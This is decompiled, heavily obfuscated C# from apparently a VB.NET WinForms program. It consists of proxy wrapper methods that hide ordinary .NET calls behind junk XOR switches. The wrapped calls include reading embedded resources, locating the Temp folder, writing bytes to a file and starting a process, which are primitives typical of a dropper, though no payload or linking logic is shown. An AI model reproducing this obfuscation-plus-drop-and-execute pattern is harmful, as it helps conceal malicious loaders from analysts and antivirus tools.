using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;

namespace ns0;

internal sealed class Class10
{
	internal sealed class Class11
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 78)]
		private struct Struct6
		{
		}

		private static readonly object object_0;

		private static readonly Array array_0;

		private static readonly Array array_1;

		internal static byte byte_0/* Not supported: data(00) */;

		[SecuritySafeCritical]
		internal static bool smethod_0<T>(T gparam_0, short short_0, int int_0) where T : WindowsFormsApplicationBase
		{
			int num = 0;
			bool result = (((int_0 ^ short_0) - 4) ^ 0) switch
			{
				0 => ((WindowsFormsApplicationBase)gparam_0).get_SaveMySettingsOnExit(), 
				_ => false, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_1<T>(T gparam_0, int int_0, int int_1) where T : Control
		{
			int num = 0;
			switch (((int_0 ^ int_1) - 68) ^ 0)
			{
			case 0:
				((Control)gparam_0).SuspendLayout();
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static Assembly smethod_2(short short_0, int int_0)
		{
			int num = 0;
			Assembly result;
			do
			{
				result = (((int_0 ^ short_0) - 18) ^ num) switch
				{
					0 => Assembly.GetExecutingAssembly(), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_3<T, U, V>(T gparam_0, V gparam_1, U gparam_2, int int_0, short short_0) where T : XElement where V : XName
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 117) ^ 0)
			{
			case 0:
				((XElement)gparam_0).SetAttributeValue((XName)(object)gparam_1, (object)gparam_2);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static void smethod_4<T, U>(T gparam_0, U gparam_1, int int_0, short short_0) where T : Hashtable
		{
			int num = 0;
			int num2;
			do
			{
				switch (((int_0 ^ short_0) - 37) ^ num)
				{
				case 0:
					gparam_0.Remove(gparam_1);
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		[SecuritySafeCritical]
		internal static Exception smethod_5(int int_0, short short_0, short short_1)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			int num = 0;
			Exception result = (((short_0 ^ short_1) - 5) ^ 0) switch
			{
				0 => (Exception)(_Exception)ProjectData.CreateProjectError(int_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static StringBuilder smethod_6<T>(T gparam_0, char char_0, char char_1, char char_2) where T : StringBuilder
		{
			int num = 0;
			StringBuilder result;
			do
			{
				result = (((char_1 ^ char_2) - 92) ^ num) switch
				{
					0 => gparam_0.Append(char_0), 
					_ => null, 
				};
				num++;
			}
			while ((char_1 * char_1 + char_1) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_7<T>(T gparam_0, short short_0, int int_0)
		{
			int num = 0;
			string result = (((int_0 ^ short_0) - 111) ^ 0) switch
			{
				0 => (string)(IComparable<string>)gparam_0.ToString(), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static AppDomain smethod_8(int int_0, int int_1)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected O, but got Unknown
			int num = 0;
			AppDomain result = (((int_1 ^ int_0) - 125) ^ 0) switch
			{
				0 => (AppDomain)(_AppDomain)AppDomain.CurrentDomain, 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static object smethod_9<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : string where U : AppDomain
		{
			int num = 0;
			object result = (((char_0 ^ short_0) - 6) ^ 0) switch
			{
				0 => gparam_0.GetData(gparam_1), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_10<T, U>(U gparam_0, T gparam_1, char char_0, char char_1) where T : ResolveEventHandler where U : AppDomain
		{
			int num = 0;
			do
			{
				switch (((char_1 ^ char_0) - 97) ^ num)
				{
				case 0:
					gparam_0.ResourceResolve += gparam_1;
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		[SecuritySafeCritical]
		internal static object smethod_11<T>(T gparam_0, int int_0, int int_1)
		{
			int num = 0;
			object result = (((int_1 ^ int_0) - 107) ^ 0) switch
			{
				0 => RuntimeHelpers.GetObjectValue(gparam_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_12<T, U, V>(T gparam_0, V gparam_1, U gparam_2, int int_0, char char_0) where T : Hashtable
		{
			int num = 0;
			switch (((int_0 ^ char_0) - 117) ^ 0)
			{
			case 0:
				gparam_0.Add(gparam_1, gparam_2);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static void smethod_13<T>(T gparam_0, SizeF sizeF_0, char char_0, short short_0) where T : ContainerControl
		{
			int num = 0;
			switch (((short_0 ^ char_0) - 76) ^ 0)
			{
			case 0:
				((ContainerControl)gparam_0).set_AutoScaleDimensions(sizeF_0);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static FileSystemProxy smethod_14<T>(T gparam_0, short short_0, int int_0) where T : ServerComputer
		{
			int num = 0;
			FileSystemProxy result = (FileSystemProxy)((((int_0 ^ short_0) - 49) ^ 0) switch
			{
				0 => ((ServerComputer)gparam_0).get_FileSystem(), 
				_ => null, 
			});
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_15<T>(T gparam_0, int int_0, char char_0) where T : SpecialDirectoriesProxy
		{
			int num = 0;
			string result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 25) ^ num) switch
				{
					0 => ((SpecialDirectoriesProxy)gparam_0).get_Temp(), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_16<T>(T gparam_0, byte[] byte_1, int int_0, short short_0) where T : string
		{
			int num = 0;
			int num2;
			do
			{
				switch (((short_0 ^ int_0) - 8) ^ num)
				{
				case 0:
					File.WriteAllBytes(gparam_0, byte_1);
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		[SecuritySafeCritical]
		internal static Assembly smethod_17<T>(T gparam_0, int int_0, short short_0) where T : ResolveEventArgs
		{
			int num = 0;
			Assembly result = (((int_0 ^ short_0) - 104) ^ 0) switch
			{
				0 => gparam_0.RequestingAssembly, 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static int smethod_18<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, int int_2, char char_0) where T : Stream
		{
			int num = 0;
			int result = (((char_0 ^ int_2) - 120) ^ 0) switch
			{
				0 => gparam_0.Read(byte_1, int_0, int_1), 
				_ => int_0, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static XAttribute smethod_19<T, U>(U gparam_0, T gparam_1, short short_0, short short_1) where T : XName where U : XElement
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			int num = 0;
			XAttribute result;
			int num2;
			do
			{
				result = (XAttribute)((((short_0 ^ short_1) - 30) ^ num) switch
				{
					0 => (object)(XObject)((XElement)gparam_0).Attribute((XName)(object)gparam_1), 
					_ => null, 
				});
				num++;
				num2 = short_1 * short_1;
				num2 = short_1 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static bool smethod_20<T, U>(T gparam_0, U gparam_1, int int_0, char char_0) where T : Hashtable
		{
			int num = 0;
			bool result;
			do
			{
				result = (((char_0 ^ int_0) - 53) ^ num) switch
				{
					0 => gparam_0.ContainsKey(gparam_1), 
					_ => false, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static SettingsBase smethod_21<T>(T gparam_0, char char_0, int int_0) where T : SettingsBase
		{
			int num = 0;
			SettingsBase result = (SettingsBase)((((int_0 ^ char_0) - 22) ^ 0) switch
			{
				0 => SettingsBase.Synchronized((SettingsBase)(object)gparam_0), 
				_ => null, 
			});
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_22<T, U>(U gparam_0, T gparam_1, int int_0, int int_1) where T : EventHandler where U : Form
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 14) ^ 0)
			{
			case 0:
				((Form)gparam_0).add_Load((EventHandler)gparam_1);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static string[] smethod_23<T>(T gparam_0, short short_0, char char_0) where T : Assembly
		{
			int num = 0;
			string[] result;
			int num2;
			do
			{
				result = (((char_0 ^ short_0) - 116) ^ num) switch
				{
					0 => gparam_0.GetManifestResourceNames(), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_24<T, U>(U gparam_0, T gparam_1, short short_0, short short_1) where U : XObject
		{
			int num = 0;
			int num2;
			do
			{
				switch (((short_1 ^ short_0) - 1) ^ num)
				{
				case 0:
					((XObject)gparam_0).AddAnnotation((object)gparam_1);
					break;
				}
				num++;
				num2 = short_1 * short_1;
				num2 = short_1 + num2;
			}
			while (num2 % 2 != 0);
		}

		[SecuritySafeCritical]
		internal static XName smethod_25<T>(T gparam_0, char char_0, char char_1) where T : XAttribute
		{
			int num = 0;
			XName result;
			int num2;
			do
			{
				result = (XName)((((char_0 ^ char_1) - 32) ^ num) switch
				{
					0 => (IEquatable<XName>)((XAttribute)gparam_0).get_Name(), 
					_ => null, 
				});
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_26<T>(T gparam_0, string[] string_0, short short_0, int int_0) where T : WindowsFormsApplicationBase
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 50) ^ 0)
			{
			case 0:
				((WindowsFormsApplicationBase)gparam_0).Run(string_0);
				break;
			}
			num++;
		}

		static Class11()
		{
			array_0 = new char[39];
			char[] array = new char[8];
			array[1] = 'F';
			array[2] = 'ⵂ';
			array[7] = '㬿';
			array[3] = 'ᔿ';
			array[5] = 'g';
			array[0] = '\u20d5';
			array[4] = '⌉';
			array[6] = 'ɯ';
			array_1 = new string[1];
			object_0 = array;
		}
	}

	[SecuritySafeCritical]
	internal static void smethod_0(int int_0, short short_0)
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ int_0) - 53) ^ num)
			{
			case 1:
				ProjectData.EndApp();
				break;
			case 0:
				ProjectData.ClearProjectError();
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	[SecuritySafeCritical]
	internal static void smethod_1<T>(T gparam_0, char char_0, int int_0) where T : Exception
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ int_0) - 102) ^ num)
			{
			case 0:
				ProjectData.SetProjectError((Exception)gparam_0);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	[SecuritySafeCritical]
	internal static bool smethod_2<T, U>(U gparam_0, T gparam_1, int int_0, int int_1) where T : string where U : string
	{
		int num = 0;
		bool result = (((int_1 ^ int_0) - 75) ^ 0) switch
		{
			0 => gparam_0.Equals(gparam_1), 
			_ => true, 
		};
		num++;
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_3(bool bool_0, short short_0, short short_1)
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ short_1) - 91) ^ num)
			{
			case 0:
				Application.SetCompatibleTextRenderingDefault(bool_0);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	[SecuritySafeCritical]
	internal static SpecialDirectoriesProxy smethod_4<T>(T gparam_0, int int_0, int int_1) where T : FileSystemProxy
	{
		int num = 0;
		SpecialDirectoriesProxy result = (SpecialDirectoriesProxy)((((int_1 ^ int_0) - 111) ^ 0) switch
		{
			0 => ((FileSystemProxy)gparam_0).get_SpecialDirectories(), 
			_ => null, 
		});
		num++;
		return result;
	}

	[SecuritySafeCritical]
	internal static byte[] smethod_5<T>(T gparam_0, short short_0, char char_0) where T : MemoryStream
	{
		int num = 0;
		byte[] result;
		do
		{
			result = (((char_0 ^ short_0) - 105) ^ num) switch
			{
				0 => (byte[])(Array)gparam_0.ToArray(), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static XAttribute smethod_6<T>(T gparam_0, char char_0, char char_1) where T : XAttribute
	{
		int num = 0;
		XAttribute result = (XAttribute)((((char_1 ^ char_0) - 84) ^ 0) switch
		{
			0 => ((XAttribute)gparam_0).get_NextAttribute(), 
			_ => null, 
		});
		num++;
		return result;
	}

	[SecuritySafeCritical]
	internal static bool smethod_7<T, U>(U gparam_0, T gparam_1, short short_0, char char_0)
	{
		int num = 0;
		bool result;
		do
		{
			result = (((char_0 ^ short_0) - 122) ^ num) switch
			{
				0 => object.ReferenceEquals(gparam_0, gparam_1), 
				_ => false, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static string smethod_8<T>(T gparam_0, char char_0, char char_1) where T : XNamespace
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((char_1 ^ char_0) - 124) ^ num) switch
			{
				0 => (string)(IEquatable<string>)((XNamespace)gparam_0).get_NamespaceName(), 
				_ => null, 
			};
			num++;
			num2 = char_1 * char_1;
			num2 = char_1 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_9<T>(T gparam_0, ref bool bool_0, int int_0, short short_0)
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ int_0) - 8) ^ num)
			{
			case 0:
				Monitor.Enter(gparam_0, ref bool_0);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	[SecuritySafeCritical]
	internal static void smethod_10<T>(T gparam_0, AutoScaleMode autoScaleMode_0, short short_0, int int_0) where T : ContainerControl
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		do
		{
			switch (((short_0 ^ int_0) - 42) ^ num)
			{
			case 0:
				((ContainerControl)gparam_0).set_AutoScaleMode(autoScaleMode_0);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	[SecuritySafeCritical]
	internal static Process smethod_11<T>(T gparam_0, short short_0, int int_0) where T : string
	{
		int num = 0;
		Process result;
		int num2;
		do
		{
			result = (((int_0 ^ short_0) - 15) ^ num) switch
			{
				0 => (Process)(Component)Process.Start(gparam_0), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_12<T, U, V>(V gparam_0, T gparam_1, U gparam_2, char char_0, char char_1) where T : string where V : AppDomain
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_1 ^ char_0) - 58) ^ num)
			{
			case 0:
				gparam_0.SetData(gparam_1, gparam_2);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}
}
